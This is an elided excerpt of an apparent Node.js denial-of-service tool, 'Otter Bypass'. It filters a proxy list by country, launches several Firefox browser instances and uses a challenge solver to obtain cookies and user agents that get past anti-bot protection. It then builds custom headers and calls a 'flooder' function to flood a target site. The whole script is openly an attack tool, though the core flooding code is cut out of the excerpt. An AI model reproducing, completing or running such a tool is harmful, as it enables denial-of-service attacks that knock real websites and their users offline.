...
country_proxy = process.argv[6],
requetetimeout = process.argv[7],
proxylist = process.argv[8],
...
var config = {
    maxbrowser: 5, // edit the browser number here
}

function randomproxys() {
    return proxys[Math.floor(Math.random() * proxys.length)]
}

logger('Otter Bypass Using Firefox Browser')
logger(`Target: ${color.cyan}[${target}]${color.reset} | Time: ${color.cyan}[${time}]${color.reset} | Proxys Count: ${color.cyan}[${proxys.length}]${color.reset}`)
logger(`Desired Proxy Country: ${color.cyan}[${country_proxy}]${color.reset} | Desired Browser Count: ${color.cyan}[${config.maxbrowser}]${color.reset} | Requete Per Ip: ${color.cyan}[${requeteperip}]${color.reset}`)
...
if(country_proxy == 'ALL' || country_proxy == 'all') {
    ...
    function allfunc() {
        ...
        proxys.forEach((p) => {
            ...
            if(geo.country == null || !geo.country) return logger('Failed To Locate Proxy'), process.exit(-1);
        ...
        logger(`${color.cyan}[${ps}]${color.reset} Proxys As Been Check`)
        ...
        function startt() {
            ...
            for(var z = 0; z <config.maxbrowser;z++) {
    ...
    function localiseproxys() {
        ...
        if(izi == 0) {
            logger(`Exiting Script No ${color.cyan}[${country_proxy}]${color.reset} Proxys Find In ${color.cyan}[${proxylist}]${color.reset}`)
            process.exit(-1)
        }
    
        logger(`${color.cyan}[${ps}]${color.reset} Proxys As Been Check`)
        logger(`There Is ${color.cyan}[${izi}]${color.reset} Proxys ${color.cyan}[${country_proxy}]${color.reset} In ${color.cyan}[${proxylist}]${color.reset}`)
...
function start_browser(api_proxy,countrycode) {
    ...
    logger(`${color.cyan}[${api_proxy}]${color.reset} Starting Browsing ${countrycode}`)
    ...
    request({
        ...
        if(err){
            ...
            if(solver.status == 'ok'){
                logger(`${color.cyan}[${api_proxy}]${color.reset} Status: ${solver.status}.`)
                var useragent = solver.solution.userAgent
                if(solver.solution.cookies === undefined || !solver.solution.cookies){
                    console.log(`${color.cyan}[${api_proxy}]${color.reset} Have No Cookie Maybe Next Request.`)
                }
                ...
                if(solver.solution.cookies !== undefined) {
                    ...
                    logger(`${color.cyan}[${api_proxy}]${color.reset} Solved Challenge.`)
                    logger(`${color.cyan}[${api_proxy}]${color.reset} Get Cookie: ${cookie}.`)
                    logger(`${color.cyan}[${api_proxy}]${color.reset} Get Uas: ${useragent}`)
                    buildflood(api_proxy,useragent,cookie,countrycode)
                }

            }else {
                logger(`${color.cyan}[${api_proxy}]${color.reset} Status: \x1b[31mdead\x1b[0m. Message: ${solver.message}`)
            }
        }
    })    
}
...
function buildflood(proxy, uas, cookie, countrycode) {
    ...
    logger(`${color.cyan}[${proxy}]${color.reset} Adapting Header For ${countrycode} And Make A Custom Header`)
    ...
    if(cookie == 'undefined' || !cookie) cookie = request.jar()
...
function flooder(proxy, ua, cookie, header) {
    ...
    logger(`${color.cyan}[${proxy}]${color.reset} Started Flood.`)
